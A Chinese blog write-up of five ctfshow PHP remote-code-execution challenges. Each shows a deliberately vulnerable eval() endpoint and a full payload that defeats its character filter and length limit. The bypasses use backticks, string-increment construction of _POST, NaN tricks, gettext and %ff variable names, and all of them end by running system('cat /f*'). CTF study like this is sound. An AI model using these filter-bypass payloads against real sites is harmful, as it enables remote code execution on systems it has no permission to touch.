---
title: 复现 ctfshow 每周大挑战(RCE极限挑战
date: 2025-07-31 17:37:15
updated: 2025-09-02 21:30:20
author: Xebdria
categories:
  - ctfshow
  - wp
permalink: http://xendria.icu/index.php/2025/07/31/%e5%a4%8d%e7%8e%b0-ctfshow-%e6%af%8f%e5%91%a8%e5%a4%a7%e6%8c%91%e6%88%98rce%e6%9e%81%e9%99%90%e6%8c%91%e6%88%98/
---
<!-- wp:paragraph -->
<p>附上官方wp<a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">一</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
error_reporting(0);
highlight_file(__FILE__);

$code = $_POST['code'];

$code = str_replace("(","括号",$code);

$code = str_replace(".","点",$code);

eval($code);
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我们可以看到是过滤了(和.<br>那么我们的system()是不能用了，直接是可以用反引号执行命令的姿势来使用<br>code=echo `ls /`;</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">二</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow)) {
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>首先，我们可以看到过滤了很多东西  "/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/"<br>我们可以看看有什么没有过滤掉的</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
for ($i=32;$i<127;$i++){
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",chr($i))){
            echo chr($i)." ";
        }
}
?>
# ! $ ' ( ) + , . / ; = [ ] _ </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>可知有! $ ' ( ) + , . / ; = [ ] _ 未被过滤，运用的是一种变量自增的方法来构造payload<br>当变量赋值为[]时候，echo出来的是Array，当变量为[]._时就是Array_。然后echo出来就是A</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":493,"width":"559px","height":"auto","sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full is-resized"><img src="http://xendria.icu/wp-content/uploads/2025/07/9b5f5307-dd03-4451-9ff7-ba12084e2565.png" alt="" class="wp-image-493" style="width:559px;height:auto"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>那这个时候就有朋友要问了，为什么一定要[]._拼接呢？这是因为[]只是创造了一个空数组，由于数组为空，该元素不存在 → 返回 null。而[]._则是Array拼接上_成为字符串才能用$_[0]把A输出，0的话可以用条件判断的方式来替代。<br>然后后续的步骤就是运用自增和拼接来创造了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>$_=[].'';//Array
$_=$_[''=='$'];//[''=='$']为假，所以等价于[0],所以就是A
$____='_';//_
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//P
$____.=$__;//_P
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O
$____.=$__;//_PO
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S
$____.=$__;//_POS
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T
$____.=$__;//_POST
$_=$____;//_POST
$$_[__]($$_[_]);//$_POST[__]($_POST[_]);当然了如果想构造GET同理，但是不知道为什么get我就是弄不出来回显，奇奇怪怪的</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>贴上payload：ctf_show=$_=[].'';$_=$_[''=='$'];$____='<em>';$_</em>=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$____;$$_<a href="$$_[_]"></a><strong>;</strong>&=system&_=cat /f*</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">三</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 105) {
        if (!preg_match("/[a-zA-Z2-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>细心的朋友发现了，这题加了一个if判断if (is_string($ctfshow) && strlen($ctfshow) <= 105)，说明我们需要瘦身一下了。<br>与上题还有什么区别呢，过滤的变了一点点</p>
<!-- /wp:paragraph -->

<!-- wp:group {"layout":{"type":"flex","flexWrap":"nowrap"}} -->
<div class="wp-block-group"><!-- wp:image {"id":495,"width":"680px","height":"auto","sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://xendria.icu/wp-content/uploads/2025/07/c63f02a5-ee17-451f-80c2-d4bb778a215b-1024x263.png" alt="" class="wp-image-495" style="width:680px;height:auto"/></figure>
<!-- /wp:image --></div>
<!-- /wp:group -->

<!-- wp:paragraph -->
<p>$ ( ) + , . / 0 1 ; = [ ] _   很明显的多了几个没有被ban的<br>虽然多了几个可用的字符但是对于长度的限制导致我们好像不能用上一个来整了(太长了)<br>无处可寻翻了翻官方wp<br>这边的思路是运用(0/0)和(1/0)来构造float中的NAN和INF来进行一个省略自增的数量，<br>构造的话还是差不多</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>$_=(0/0)._;     //NaN_
$_=$_[0];       //N
$__=++$_;       //$__=O
$__=++$_.$__;   //$__=PO
$_++;$_++;      //Q、R
$__=$__.++$_;   //$__=POS
$__=$__.++$_;   //$__=POST
$_=_.$__;       //$_=_POST
$$_[0]($$_[1]); //$_POST[0]($_POST[1]);</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>依旧是附上payload:ctf_show=%24_%3D(0%2F0)._%3B%24_%3D%24_%5B0%5D%3B%24__%3D%2B%2B%24_%3B%24__%3D%2B%2B%24_.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24__.%2B%2B%24_%3B%24__%3D%24__.%2B%2B%24_%3B%24_%3D_.%24__%3B%24%24_%5B0%5D(%24%24_%5B1%5D)%3B&0=system&1=cat /f*
不编码Hackbar会失败，长度的话刚好是103<105</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">四</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 84) {
        if (!preg_match("/[a-zA-Z1-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>没被ban的有这几个$ ( ) + , . / 0 ; = [ ] _<br>然后就是长度限制变成84了，然后就是尝试了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>我尝试依靠上一题的基础来进行这一题的编写
$_=(0/0)._;$_=$_[0];$__=++$_;$__=_.++$_.$__;++$_;++$_;$__.=++$_.++$_;$$__[0]($$__[_]);
点了一下86，超出了84的限制。。。</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>那我们该从哪里优化呢，主播想不出来了，然后看到官方wp中的<code>(_/_._)[0];</code>也是等于N的，真是优雅，利用(_/_._)为0的结果来直接构造出N，那么我们的payload也就能出来了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ctf_show=$_=(_/_._)[0];;$__=++$_;$__=_.++$_.$__;++$_;++$_;$__.=++$_.++$_;$$__[0]($$__[_]);&0=system&_=cat /f*    依旧与上题一样在hackbar要先编码一次
ctf_show=%24_%3D(_%2F_._)%5B0%5D%3B%3B%24__%3D%2B%2B%24_%3B%24__%3D_.%2B%2B%24_.%24__%3B%2B%2B%24_%3B%2B%2B%24_%3B%24__.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24__%5B0%5D(%24%24__%5B_%5D)%3B&0=system&_=cat /f*</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>还有一种解法是说使用burp利用不可见字符%ff也能通过（我留着下一题写）</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">五</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>也是终于最后一题了，话不多说上代码</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 73) {
        if (!preg_match("/[a-zA-Z0-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>诶，长度限制变成了73，然后只剩下了$ ( ) + , . / ; = [ ] _这些可用，0居然也不能用了诶。<br>那怎么办呢？这局应该就是这个phpinfo()该起作用的时候了<br>官方wp说<br><strong>这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）</strong><br>就是说可用用_()就等于gettext()<br>我们可用_(_/_)[0]来构造N</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>然后后面就是正常的构造，直接贴上官方wp了
$a=_(a/a)[a];//相当于gettext(0/0)[0],得到N
$_=++$a;//O
$_=_.++$a.$_;//_PO
$a++;$a++;//R
$_.=++$a.++$a;//_POST
$$_[a]($$_[_]);//$_POST[a]($_POST[_])</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>然后就是把$a替换为不可见字符变量</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&_=system&%ff=cat /f*</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":505,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/07/bf6b932f-4ba4-4304-9cb6-79ab40ad62b1-1024x518.png" alt="" class="wp-image-505"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>对于这题官方wp还有更加简短的payload（师傅们真是太强辣！），可以配合这位师傅的文章一起食用<a href="https://blog.csdn.net/qq_38798840/article/details/130944199">https://blog.csdn.net/qq_38798840/article/details/130944199</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">小结</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>用了两天才磕磕碰碰做完了这五题，让我加深了自增这方面的印象吧（原来到处都可以加上这个pwp），也积累了这种题型，呜，自己还是有点太懒了，要勤奋一些了。</p>
<!-- /wp:paragraph -->